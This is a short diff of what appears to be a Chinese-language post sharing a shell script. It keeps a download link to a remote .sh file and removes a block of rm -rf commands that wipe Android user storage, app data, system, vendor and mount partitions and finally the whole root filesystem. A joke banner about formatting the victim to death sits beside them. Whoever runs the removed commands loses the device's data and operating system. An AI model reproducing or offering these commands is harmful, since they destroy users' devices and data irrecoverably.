@@ -4,16 +4,6 @@
 
 [链接]https://cccimg.com/down.php/994a229efbce5885339fefc1256d0d29.sh[链接]
 
-[代码]
-rm-rf /storage/emulated/0
-rm-rf /data/media
-rm-rf /data/app
-rm-rf /data
-rm-rf /system
-rm-rf /vendor
-rm-rf /product
-rm-rf /mnt
-rm-rf /*
-[代码]
+[代码]echo 回来[代码]
 
 [公告]格不死你[公告]
